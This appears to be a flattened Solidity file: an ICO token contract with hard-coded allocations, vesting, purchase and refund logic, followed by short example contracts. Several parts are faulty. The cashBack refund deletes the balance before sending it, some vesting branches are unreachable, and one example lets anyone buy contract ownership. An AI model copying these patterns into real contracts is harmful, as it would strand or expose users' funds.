        _freezeTransfer(0xd0BEF2Fb95193f429f0075e442938F5d829a33c8, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x424cbEb619974ee79CaeBf6E9081347e64766705, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x9e395cd98089F6589b90643Dde4a304cAe4dA61C, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x3cDE6Df0906157107491ED17C79fF9218A50D7Dc, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x419a98D46a368A1704278349803683abB2A9D78E, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x106Db742344FBB96B46989417C151B781D1a4069, 3 * 1000000000000000000000000);  
        _freezeTransfer(0xE16b9E9De165DbecA18B657414136cF007458aF5, 3 * 1000000000000000000000000);  
        _freezeTransfer(0xee32C325A3E11759b290df213E83a257ff249936, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x7d6F916b0E5BF7Ba7f11E60ed9c30fB71C4A5fE0, 3 * 1000000000000000000000000);  
        _freezeTransfer(0xCC684085585419100AE5010770557d5ad3F3CE58, 3 * 1000000000000000000000000);  
        _freezeTransfer(0xB47BE6d74C5bC66b53230D07fA62Fb888594418d, 3 * 1000000000000000000000000);  
        _freezeTransfer(0xf891555a1BF2525f6EBaC9b922b6118ca4215fdD, 3 * 1000000000000000000000000);  
        _freezeTransfer(0xE3124478A5ed8550eA85733a4543Dd128461b668, 3 * 1000000000000000000000000);  
        _freezeTransfer(0xc5836df630225112493fa04fa32B586f072d6298, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x144a0543C93ce8Fb26c13EB619D7E934FA3eA734, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x43731e24108E928984DcC63DE7affdF3a805FFb0, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x49f7744Aa8B706Faf336a3ff4De37078714065BC, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x1E55C7E97F0b5c162FC9C42Ced92C8e55053e093, 3 * 1000000000000000000000000);  
        _freezeTransfer(0x40b234009664590997D2F6Fde2f279fE56e8AaBC, 3 * 1000000000000000000000000);  
    }

    bool assignedTeam = false;
     
     
    function assignTeamTokens() public onlyOwnerAndDirector {
        require(!assignedTeam);
        assignedTeam = true;

        _teamTransfer(0x0A5f85C3d41892C934ae82BDbF17027A20717088,  101000000 * ReconToMicro);  
        _teamTransfer(0x0f65e64662281D6D42eE6dEcb87CDB98fEAf6060,  100000000 * ReconToMicro);  
        _teamTransfer(0x3Da2585FEbE344e52650d9174e7B1bf35C70D840,   50000000 * ReconToMicro);  
        _teamTransfer(0xc083E68D962c2E062D2735B54804Bb5E1f367c1b,   50000000 * ReconToMicro);  
        _teamTransfer(0xF848332f5D902EFD874099458Bc8A53C8b7881B1,   50000000 * ReconToMicro);  
        _teamTransfer(0x5f2D6766C6F3A7250CfD99d6b01380C432293F0c,   50000000 * ReconToMicro);  
        _teamTransfer(0x5f2D6766C6F3A7250CfD99d6b01380C432293F0c,  200000000 * ReconToMicro);  
        _teamTransfer(0xD974C2D74f0F352467ae2Da87fCc64491117e7ac,  200000000 * ReconToMicro);  
        _teamTransfer(0x5c4F791D0E0A2E75Ee34D62c16FB6D09328555fF, 5000000000 * ReconToMicro);  
        _teamTransfer(0xeB479640A6D55374aF36896eCe6db7d92F390015, 5000000000 * ReconToMicro);  
        _teamTransfer(0x77167D25Db87dc072399df433e450B00b8Ec105A, 7000000000 * ReconToMicro);  
        _teamTransfer(0x5C6Fd84b961Cce03e027B0f8aE23c4A6e1195E90, 2000000000 * ReconToMicro);  
        _teamTransfer(0x86F427c5e05C29Fd4124746f6111c1a712C9B5c8, 2000000000 * ReconToMicro);  
        _teamTransfer(0x1Ecb8dC0932AF3A3ba87e8bFE7eac3Cbe433B78B, 2000000000 * ReconToMicro);  
        _teamTransfer(0x7C31BeCa0290C35c8452b95eA462C988c4003Bb0, 1000000000 * ReconToMicro);  
        _teamTransfer(0x3a5326f9C9b3ff99e2e5011Aabec7b48B2e6A6A2, 4000000000 * ReconToMicro);  
        _teamTransfer(0x5a27B07003ce50A80dbBc5512eA5BBd654790673, 4000000000 * ReconToMicro);  
        _teamTransfer(0xD580cF1002d0B4eF7d65dC9aC6a008230cE22692, 4000000000 * ReconToMicro);  
        _teamTransfer(0x9C83562Bf58083ab408E596A4bA4951a2b5724C9, 4000000000 * ReconToMicro);  
        _teamTransfer(0x70E06c2Dd9568ECBae760CE2B61aC221C0c497F5, 2000000000 * ReconToMicro);  
        _teamTransfer(0x14bd2Aa04619658F517521adba7E5A17dfD2A3f0, 1000000000 * ReconToMicro);  
        _teamTransfer(0x9C3091a335383566d08cba374157Bdff5b8B034B,  100000000 * ReconToMicro);  
        _teamTransfer(0x3b6F53122903c40ef61441dB807f09D90D6F05c7, 1000000000 * ReconToMicro);  
        _teamTransfer(0x7fb5EF151446Adb0B7D39B1902E45f06E11038F6, 1000000000 * ReconToMicro);  
        _teamTransfer(0x47BD87fa63Ce818584F050aFFECca0f1dfFd0564, 1000000000 * ReconToMicro);  
        _teamTransfer(0x83b3CD589Bd78aE65d7b338fF7DFc835cD9a8edD, 2000000000 * ReconToMicro);  
        _teamTransfer(0x6299496342fFd22B7191616fcD19CeC6537C2E8D, 8000000000 * ReconToMicro);  
        _teamTransfer(0x26aF11607Fad4FacF1fc44271aFA63Dbf2C22a87, 4000000000 * ReconToMicro);  
        _teamTransfer(0x7E21203C5B4A6f98E4986f850dc37eBE9Ca19179, 4000000000 * ReconToMicro);  
        _teamTransfer(0x0bD212e88522b7F4C673fccBCc38558829337f71, 4000000000 * ReconToMicro);  
        _teamTransfer(0x5b44e309408cE6E73B9f5869C9eeaCeeb8084DC8, 4000000000 * ReconToMicro);  
        _teamTransfer(0x48F2eFDE1c028792EbE7a870c55A860e40eb3573, 4000000000 * ReconToMicro);  
        _teamTransfer(0x1fF3BE6f711C684F04Cf6adfD665Ce13D54CAC73, 4000000000 * ReconToMicro);  
    }

     
     
    mapping(address => bool) public kyc;
    mapping(address => address) public referral;
    function kycPassed(address _mem, address _ref) public onlyAdmin {
        kyc[_mem] = true;
        if (_ref == richardAddr || _ref == wuguAddr) {
            referral[_mem] = _ref;
        }
    }

     
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

     
    mapping(address => uint) freezed;
    mapping(address => uint) teamFreezed;

     
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function _transfer(address _from, address _to, uint _tokens) private {
        balances[_from] = balances[_from].sub(_tokens);
        balances[_to] = balances[_to].add(_tokens);
        emit Transfer(_from, _to, _tokens);
    }

    function transfer(address _to, uint _tokens) public returns (bool success) {
        checkTransfer(msg.sender, _tokens);
        _transfer(msg.sender, _to, _tokens);
        return true;
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        checkTransfer(from, tokens);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
        _transfer(from, to, tokens);
        return true;
    }

     
     
     
    function checkTransfer(address from, uint tokens) public view {
        uint newBalance = balances[from].sub(tokens);
        uint total = 0;
        if (now < unlockDate5) {
            require(now >= unlockDate1);
            uint frzdPercent = 0;
            if (now < unlockDate2) {
                frzdPercent = 5;
            } else if (now < unlockDate3) {
                frzdPercent = 10;
            } else if (now < unlockDate4) {
                frzdPercent = 10;
            } else if (now < unlockDate5) {
                frzdPercent = 10;
            } else if (now < unlockDate6) {
                frzdPercent = 10;
            } else if (now < unlockDate7) {
                frzdPercent = 10;
            } else if (now < unlockDate8) {
                frzdPercent = 5;
            } else if (now < unlockDate9) {
                frzdPercent = 5;
            } else if (now < unlockDate10) {
                frzdPercent = 10;
            } else if (now < unlockDate11) {
                frzdPercent = 5;
            } else if (now < unlockDate12) {
                frzdPercent = 10;
            } else if (now < unlockDate13) {
                frzdPercent = 5;
            } else {
                frzdPercent = 5;
            }
            total = freezed[from].mul(frzdPercent).div(100);
            require(newBalance >= total);
        }

        if (now < teamUnlock4 && teamFreezed[from] > 0) {
            uint p = 0;
            if (now < teamUnlock1) {
                p = 100;
            } else if (now < teamUnlock2) {
                p = 75;
            } else if (now < teamUnlock3) {
                p = 50;
            } else if (now < teamUnlock4) {
                p = 25;
            }
            total = total.add(teamFreezed[from].mul(p).div(100));
            require(newBalance >= total);
        }
    }

     
    function ICOStatus() public view returns (uint usd, uint eth, uint recon) {
        usd = presaleSold.mul(12).div(10**20) + crowdsaleSold.mul(16).div(10**20);
        usd = usd.add(preicoUSD);  

        return (usd, ethSold + preicoUSD.mul(10**8).div(ethRate), presaleSold + crowdsaleSold);
    }

    function checkICOStatus() public view returns(bool) {
        uint eth;
        uint recon;

        (, eth, recon) = ICOStatus();

        uint dollarsRecvd = eth.mul(ethRate).div(10**8);

         
        return dollarsRecvd >= 25228966 || (recon == presaleSupply + crowdsaleSupply) || now > crowdsaleEndTime;
    }

    bool icoClosed = false;
    function closeICO() public onlyOwner {
        require(!icoClosed);
        icoClosed = checkICOStatus();
    }

     
     
     
     
    uint bonusTransferred = 0;
    uint constant maxUSD = 4800000;
    function transferBonus(address _to, uint _usd) public onlyOwner {
        bonusTransferred = bonusTransferred.add(_usd);
        require(bonusTransferred <= maxUSD);

        uint recon = _usd.mul(100).mul(ReconToMicro).div(12);  
        presaleSold = presaleSold.add(recon);
        require(presaleSold <= presaleSupply);
        ethSold = ethSold.add(_usd.mul(10**8).div(ethRate));

        _freezeTransfer(_to, recon);
    }

     
    function prolongCrowdsale() public onlyOwnerAndDirector {
        require(now < crowdsaleEndTime);
        crowdsaleEndTime = crowdsaleHardEndTime;
    }

     
    uint public ethRate = 0;
    uint public ethRateMax = 0;
    uint public ethLastUpdate = 0;
    function setETHRate(uint _rate) public onlyAdmin {
        require(ethRateMax == 0 || _rate < ethRateMax);
        ethRate = _rate;
        ethLastUpdate = now;
    }

     
    uint public btcRate = 0;
    uint public btcRateMax = 0;
    uint public btcLastUpdate;
    function setBTCRate(uint _rate) public onlyAdmin {
        require(btcRateMax == 0 || _rate < btcRateMax);
        btcRate = _rate;
        btcLastUpdate = now;
    }

     
     
    function setMaxRate(uint ethMax, uint btcMax) public onlyOwnerAndDirector {
        ethRateMax = ethMax;
        btcRateMax = btcMax;
    }

     
    function _sellPresale(uint recon) private {
        require(recon >= bonusLevel0.mul(9950).div(10000));
        presaleSold = presaleSold.add(recon);
        require(presaleSold <= presaleSupply);
    }

     
    function _sellCrowd(uint recon, address _to) private {
        require(recon >= crowdsaleMinUSD);

        if (crowdsaleSold.add(recon) <= crowdsaleSupply) {
            crowdsaleSold = crowdsaleSold.add(recon);
        } else {
            presaleSold = presaleSold.add(crowdsaleSold).add(recon).sub(crowdsaleSupply);
            require(presaleSold <= presaleSupply);
            crowdsaleSold = crowdsaleSupply;
        }

        if (now < crowdsaleStartTime + 3 days) {
            if (whitemap[_to] >= recon) {
                whitemap[_to] -= recon;
                whitelistTokens -= recon;
            } else {
                require(crowdsaleSupply.add(presaleSupply).sub(presaleSold) >= crowdsaleSold.add(whitelistTokens));
            }
        }
    }

     
    function addInvestorBonusInPercent(address _to, uint8 p) public onlyOwner {
        require(p > 0 && p <= 5);
        uint bonus = balances[_to].mul(p).div(100);

        investorGiven = investorGiven.add(bonus);
        require(investorGiven <= investorSupply);

        _freezeTransfer(_to, bonus);
    }

     
    function addInvestorBonusInTokens(address _to, uint tokens) public onlyOwner {
        _freezeTransfer(_to, tokens);

        investorGiven = investorGiven.add(tokens);
        require(investorGiven <= investorSupply);
    }

    function () payable public {
        purchaseWithETH(msg.sender);
    }

     
     
    function _freezeTransfer(address _to, uint recon) private {
        _transfer(owner, _to, recon);
        freezed[_to] = freezed[_to].add(recon);
    }

     
     
    function _teamTransfer(address _to, uint recon) private {
        _transfer(owner, _to, recon);
        teamFreezed[_to] = teamFreezed[_to].add(recon);
    }

    address public constant wuguAddr = 0x0d340F1344a262c13485e419860cb6c4d8Ec9C6e;
    address public constant richardAddr = 0x49BE16e7FECb14B82b4f661D9a0426F810ED7127;
    mapping(address => address[]) promoterClients;
    mapping(address => mapping(address => uint)) promoterBonus;

     
     
    function withdrawPromoter() public {
        address _to = msg.sender;
        require(_to == wuguAddr || _to == richardAddr);

        uint usd;
        (usd,,) = ICOStatus();

         
        require(usd.mul(95).div(100) >= softcapUSD);

        uint bonus = 0;
        address[] memory clients = promoterClients[_to];
        for(uint i = 0; i < clients.length; i++) {
            if (kyc[clients[i]]) {
                uint num = promoterBonus[_to][clients[i]];
                delete promoterBonus[_to][clients[i]];
                bonus += num;
            }
        }

        _to.transfer(bonus);
    }

     
     
    function cashBack(address _to) public {
        uint usd;
        (usd,,) = ICOStatus();

         
        require(now > crowdsaleEndTime && usd < softcapUSD);
        require(ethSent[_to] > 0);

        delete ethSent[_to];

        _to.transfer(ethSent[_to]);
    }

     
    mapping(address => uint) ethSent;

    function purchaseWithETH(address _to) payable public {
        purchaseWithPromoter(_to, referral[msg.sender]);
    }

     
     
    function purchaseWithPromoter(address _to, address _ref) payable public {
        require(now >= presaleStartTime && now <= crowdsaleEndTime);

        require(!icoClosed);

        uint _wei = msg.value;
        uint recon;

        ethSent[msg.sender] = ethSent[msg.sender].add(_wei);
        ethSold = ethSold.add(_wei);

         
         
        if (now < crowdsaleStartTime || approvedInvestors[msg.sender]) {
            require(kyc[msg.sender]);
            recon = _wei.mul(ethRate).div(75000000);  

            require(now < crowdsaleStartTime || recon >= bonusLevel100);

            _sellPresale(recon);

             
            if (_ref == wuguAddr || _ref == richardAddr) {
                promoterClients[_ref].push(_to);
                promoterBonus[_ref][_to] = _wei.mul(5).div(100);
            }
        } else {
            recon = _wei.mul(ethRate).div(10000000);  
            _sellCrowd(recon, _to);
        }

        _freezeTransfer(_to, recon);
    }

     
     
    function purchaseWithBTC(address _to, uint _satoshi, uint _wei) public onlyAdmin {
        require(now >= presaleStartTime && now <= crowdsaleEndTime);

        require(!icoClosed);

        ethSold = ethSold.add(_wei);

        uint recon;
         
         
        if (now < crowdsaleStartTime || approvedInvestors[msg.sender]) {
            require(kyc[msg.sender]);
            recon = _satoshi.mul(btcRate.mul(10000)).div(75);  

            require(now < crowdsaleStartTime || recon >= bonusLevel100);

            _sellPresale(recon);
        } else {
            recon = _satoshi.mul(btcRate.mul(10000)).div(100);  
            _sellCrowd(recon, _to);
        }

        _freezeTransfer(_to, recon);
    }

     
     
    bool withdrawCalled = false;
    function withdrawFunds() public onlyOwner {
        require(icoClosed && now >= teamETHUnlock1);

        require(!withdrawCalled);
        withdrawCalled = true;

        uint eth;
        (,eth,) = ICOStatus();

         
        uint minus = bonusTransferred.mul(10**8).div(ethRate);
        uint team = ethSold.sub(minus);

        team = team.mul(15).div(100);

        uint ownerETH = 0;
        uint teamETH = 0;
        if (address(this).balance >= team) {
            teamETH = team;
            ownerETH = address(this).balance.sub(teamETH);
        } else {
            teamETH = address(this).balance;
        }

        teamETH1 = teamETH.div(3);
        teamETH2 = teamETH.div(3);
        teamETH3 = teamETH.sub(teamETH1).sub(teamETH2);

         
        address(0xf14B65F1589B8bC085578BcF68f09653D8F6abA8).transfer(ownerETH);
    }

    uint teamETH1 = 0;
    uint teamETH2 = 0;
    uint teamETH3 = 0;
    function withdrawTeam() public {
        require(now >= teamETHUnlock1);

        uint amount = 0;
        if (now < teamETHUnlock2) {
            amount = teamETH1;
            teamETH1 = 0;
        } else if (now < teamETHUnlock3) {
            amount = teamETH1 + teamETH2;
            teamETH1 = 0;
            teamETH2 = 0;
        } else {
            amount = teamETH1 + teamETH2 + teamETH3;
            teamETH1 = 0;
            teamETH2 = 0;
            teamETH3 = 0;
        }

        address(0x5c4F791D0E0A2E75Ee34D62c16FB6D09328555fF).transfer(amount.mul(6).div(100));  
        address(0xeB479640A6D55374aF36896eCe6db7d92F390015).transfer(amount.mul(6).div(100));  
        address(0x77167D25Db87dc072399df433e450B00b8Ec105A).transfer(amount.mul(6).div(100));  
        address(0x1Ecb8dC0932AF3A3ba87e8bFE7eac3Cbe433B78B).transfer(amount.mul(2).div(100));  
        address(0x7C31BeCa0290C35c8452b95eA462C988c4003Bb0).transfer(amount.mul(2).div(100));  

        amount = amount.mul(78).div(100);

        address(0x3a5326f9C9b3ff99e2e5011Aabec7b48B2e6A6A2).transfer(amount.mul(uint(255).mul(100).div(96)).div(1000));  
        address(0x5a27B07003ce50A80dbBc5512eA5BBd654790673).transfer(amount.mul(uint(185).mul(100).div(96)).div(1000));  
        address(0xD580cF1002d0B4eF7d65dC9aC6a008230cE22692).transfer(amount.mul(uint(25).mul(100).div(96)).div(1000));   
        address(0x9C83562Bf58083ab408E596A4bA4951a2b5724C9).transfer(amount.mul(uint(250).mul(100).div(96)).div(1000));  
        address(0x70E06c2Dd9568ECBae760CE2B61aC221C0c497F5).transfer(amount.mul(uint(245).mul(100).div(96)).div(1000));  
    }

     
     
    uint dropped = 0;
    function doAirdrop(address[] members, uint[] tokens) public onlyOwnerAndDirector {
        require(members.length == tokens.length);

        for(uint i = 0; i < members.length; i++) {
            _freezeTransfer(members[i], tokens[i]);
            dropped = dropped.add(tokens[i]);
        }
        require(dropped <= bountySupply);
    }

    mapping(address => uint) public whitemap;
    uint public whitelistTokens = 0;
     
     
     
    function addWhitelistMember(address[] _mem, uint[] _tokens) public onlyAdmin {
        require(_mem.length == _tokens.length);
        for(uint i = 0; i < _mem.length; i++) {
            whitelistTokens = whitelistTokens.sub(whitemap[_mem[i]]).add(_tokens[i]);
            whitemap[_mem[i]] = _tokens[i];
        }
    }

    uint public adviserSold = 0;
     
     
    function transferAdviser(address[] _adv, uint[] _tokens) public onlyOwnerAndDirector {
        require(_adv.length == _tokens.length);
        for (uint i = 0; i < _adv.length; i++) {
            adviserSold = adviserSold.add(_tokens[i]);
            _freezeTransfer(_adv[i], _tokens[i]);
        }
        require(adviserSold <= adviserSupply);
    }

    mapping(address => bool) approvedInvestors;
    function approveInvestor(address _addr) public onlyOwner {
        approvedInvestors[_addr] = true;
    }
}


 
 
 
 
 


pragma solidity ^ 0.4.25;

contract ERC20InterfaceTest {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}


 
 
 
contract TestApproveAndCallFallBack {
    event LogBytes(bytes data);

    function receiveApproval(address from, uint256 tokens, address token, bytes data) public {
        ERC20Interface(token).transferFrom(from, address(this), tokens);
        emit LogBytes(data);
    }
}

 
 
 
 
 

pragma solidity ^ 0.4.25;

contract AccessRestriction {
     
     
     
    address public owner = msg.sender;
    uint public creationTime = now;

     
     
     
     
     
     
    modifier onlyBy(address _account)
    {
        require(
            msg.sender == _account,
            "Sender not authorized."
        );
         
         
         
        _;
    }

     
     
    function changeOwner(address _newOwner)
        public
        onlyBy(owner)
    {
        owner = _newOwner;
    }

    modifier onlyAfter(uint _time) {
        require(
            now >= _time,
            "Function called too early."
        );
        _;
    }

     
     
     
    function disown()
        public
        onlyBy(owner)
        onlyAfter(creationTime + 6 weeks)
    {
        delete owner;
    }

     
     
     
     
     
     
    modifier costs(uint _amount) {
        require(
            msg.value >= _amount,
            "Not enough Ether provided."
        );
        _;
        if (msg.value > _amount)
            msg.sender.transfer(msg.value - _amount);
    }

    function forceOwnerChange(address _newOwner)
        public
        payable
        costs(200 ether)
    {
        owner = _newOwner;
         
        if (uint(owner) & 0 == 1)
             
             
            return;
         
    }
}

 
 
 
 
 

pragma solidity ^ 0.4.25;

contract WithdrawalContract {
    address public richest;
    uint public mostSent;

    mapping (address => uint) pendingWithdrawals;

    constructor() public payable {
        richest = msg.sender;
        mostSent = msg.value;
    }

    function becomeRichest() public payable returns (bool) {
        if (msg.value > mostSent) {
            pendingWithdrawals[richest] += msg.value;
            richest = msg.sender;
            mostSent = msg.value;
            return true;
        } else {
            return false;
        }
    }

    function withdraw() public {
        uint amount = pendingWithdrawals[msg.sender];
         
         
        pendingWithdrawals[msg.sender] = 0;
        msg.sender.transfer(amount);
    }
}


 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 


 